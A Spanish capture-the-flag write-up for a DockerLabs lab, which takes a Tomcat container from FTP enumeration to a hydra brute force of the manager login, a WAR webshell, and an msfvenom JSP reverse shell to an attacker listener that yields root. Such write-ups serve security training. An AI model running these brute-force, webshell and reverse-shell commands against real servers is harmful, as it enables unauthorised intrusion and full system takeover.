@@ -1,0 +1,180 @@
+---
+type: writeup
+title: -Pn
+description: Laboratorio donde se accederá con unas credenciales al panel interno de Tomcat, para después hacer intrusión al servidor.
+lang: es
+draft: false
+featured: true
+image: ../../../images/writeups/dockerlabs/dockerlabs.webp
+platform: dockerlabs
+url: https://dockerlabs.es/
+difficulty: facil
+hints: [brute force, war]
+tags: [brute force, war]
+---
+
+## Enumeration
+
+Enumeramos todos los puertos para ver cuáles están abiertos y qué servicios corren en ellos.
+
+```bash
+sudo nmap -p- -sS --min-rate 5000 -Pn -n -vv -oA nmap/allports 172.17.0.2
+```
+
+```plaintext
+PORT     STATE SERVICE    REASON
+21/tcp   open  ftp        syn-ack ttl 64
+8080/tcp open  http-proxy syn-ack ttl 64
+```
+
+```bash
+nmap -p 21,8080 -sCV -oA nmap/openports 172.17.0.2
+```
+
+```plaintext
+PORT     STATE SERVICE VERSION
+21/tcp   open  ftp     vsftpd 3.0.5
+| ftp-syst:
+|   STAT:
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged in as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session timeout in seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 2
+|      vsFTPd 3.0.5 - secure, fast, stable
+|_End of status
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
+|_vmware-version: ERROR: Script execution failed (use -d to debug)
+8080/tcp open  http    Apache Tomcat 9.0.88
+|_http-favicon: Apache Tomcat
+|_rpcinfo: ERROR: Script execution failed (use -d to debug)
+|_hnap-info: ERROR: Script execution failed (use -d to debug)
+|_http-title: Apache Tomcat/9.0.88
+|_http-trane-info: ERROR: Script execution failed (use -d to debug)
+|_https-redirect: ERROR: Script execution failed (use -d to debug)
+|_vmware-version: ERROR: Script execution failed (use -d to debug)
+|_http-server-header: ERROR: Script execution failed (use -d to debug)
+Service Info: OS: Unix
+```
+
+| Puerto | Servicio |
+| ------ | -------- |
+| 21     | FTP      |
+| 8080   | HTTP     |
+
+Iniciamos sesión de forma anónima en el servicio FTP.
+
+```bash
+ftp 172.17.0.2
+```
+
+```plaintext
+Connected to 172.17.0.2.
+220 (vsFTPd 3.0.5)
+Name (172.17.0.2:melvin): anonymous
+331 Please specify the password.
+Password:
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful. Consider using PASV.
+150 Here comes the directory listing.
+-rw-r--r--    1 0        0              74 Apr 19  2024 tomcat.txt
+226 Directory send OK.
+ftp> get tomcat.txt
+200 PORT command successful. Consider using PASV.
+150 Opening BINARY mode data connection for tomcat.txt (74 bytes).
+226 Transfer complete.
+74 bytes received in 0.0005 seconds (149.7457 kbytes/s)
+ftp> quit
+221 Goodbye.
+```
+
+Descargamos el archivo `tomcat.txt`.
+
+Leemos el contenido del archivo `tomcat.txt`.
+
+```bash
+cat tomcat.txt
+```
+
+```plaintext
+Hello tomcat, can you configure the tomcat server? I lost the password...
+```
+
+El servicio http muestra que está corriendo Apache Tomcat. Para iniciar sesión y configurar el servidor probamos credenciales por defecto. Googleamos y encontramos una lista para probar [Default Credentials](https://hackviser.com/tactics/pentesting/services/tomcat#default-credentials).
+
+![Tomcat](@images/writeups/dockerlabs/pn/pn-tomcat.png)
+
+Hacemos fuerza bruta para encontrar la contraseña del usuario `tomcat` según lo que se da a entender en el archivo `tomcat.txt`. Entre las contraseñas que probamos logramos acceso con `s3cr3t`.
+
+```bash
+hydra -l tomcat -P /usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou.txt 172.17.0.2 -s 8080 http-head /manager/html -I -t 16 -F
+```
+
+## Exploitation
+
+Ahora podemos subir un archivo `war` para obtener una webshell siguiendo estos pasos [WAR File Upload (Manager Access)](https://hackviser.com/tactics/pentesting/services/tomcat#war-file-upload-manager-access).
+
+![Upload WAR file](@images/writeups/dockerlabs/pn/pn-uploadwarfile.png)
+
+Una vez seleccionado el archivo `shell.war` presionamos el botón `Deploy`.
+
+Verificamos con `curl` la ejecución de comandos.
+
+```bash
+curl http://172.17.0.2:8080/shell/shell.jsp?cmd=id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+También podemos crear una reverse shell para acceder al servidor.
+
+```bash
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.17.0.1 LPORT=1111 -f war -o rev.war
+```
+
+Subimos el archivo. Nos ponemos en escucha en la máquina atacante.
+
+```bash
+nc -lnvp 1111
+```
+
+Accedemos a `http://172.17.0.2:8080/rev/` desde el navegador y recibimos la conexión.
+
+```plaintext
+Connection received on 172.17.0.2 33214
+```
+
+Estabilizamos la shell y verificamos como qué usuario estamos.
+
+```bash
+script /dev/null -c bash
+```
+
+Presionar las teclas `ctrl + z`.
+
+```bash
+stty raw -echo; fg
+reset xterm
+export TERM=xterm
+export SHELL=bash
+stty rows 30 columns 171
+```
+
+```bash
+id
+```
+
+```plaintext
+uid=0(root) gid=0(root) groups=0(root)
+```
